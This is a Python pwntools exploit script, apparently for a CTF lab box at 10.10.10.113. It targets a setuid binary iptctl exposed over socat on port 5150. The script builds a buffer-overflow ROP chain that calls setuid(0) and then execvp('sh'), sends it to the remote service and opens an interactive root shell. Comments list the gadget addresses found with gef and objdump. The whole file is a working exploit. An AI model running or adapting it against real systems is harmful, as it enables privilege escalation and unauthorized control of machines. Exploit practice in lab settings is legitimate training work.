#!/usr/bin/python3
# coding: utf-8

from pwn import *

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# registradores = rdi rsi rdx rcx r8 r9

# payload = "allow" + "A" * 29 + pop_rdi + null + setuid + pop_rdi + sh_addr + pop_rsi_r15 + null + null + execvp + '\n1.1.1.1\n'

# rhost = socat TCP-LISTEN:5150 EXEC:'/opt/iptctl/iptctl -i'

# Variable_Globals
main_url = "10.10.10.113"
port = 5150
offset = 29

def exploit():
	
	pop_rdi = p64(0x400de3)
	# gef>  rop
	# 0x0000000000400de3: pop rdi; ret;

	setuid = p64(0x400780)
	# objdump -D iptctl| grep suid
	# 0000000000400780 <setuid@plt>:
	# 400780:	ff 25 e2 18 20 00    	jmpq   *0x2018e2(%rip)        # 602068 <setuid@GLIBC_2.2.5>
	# 400d00:	e8 7b fa ff ff       	callq  400780 <setuid@plt>

	sh_addr = p64(0x40046e)
	# gef>  grep "sh"
	# 0x40046e - 0x400470  →   "sh"

	pop_rsi = p64(0x400de1)
	# gef>  rop
	# 0x0000000000400de1: pop rsi; pop r15; ret;

	execvp = p64(0x400760)
	# objdump -D iptctl| grep "exec"
	# 0000000000400760 <execvp@plt>:
	# 400760:	ff 25 f2 18 20 00    	jmpq   *0x2018f2(%rip)        # 602058 <execvp@GLIBC_2.2.5>
	# 400d13:	e8 48 fa ff ff       	callq  400760 <execvp@plt>

	payload = b"allow" + b"A" * offset 
	payload += pop_rdi 
	payload += p64(0) 
	payload += setuid 
	payload += pop_rdi 
	payload += sh_addr 
	payload += pop_rsi 
	payload += p64(0)
	payload += p64(0)
	payload += execvp
	payload += b"\n1.1.1.1\n"

	try:
		p = remote(main_url,port)
	except Exception as e:
		log.error(str(e))

	p.sendline(payload)
	p.interactive()

if __name__ == '__main__':
	exploit()
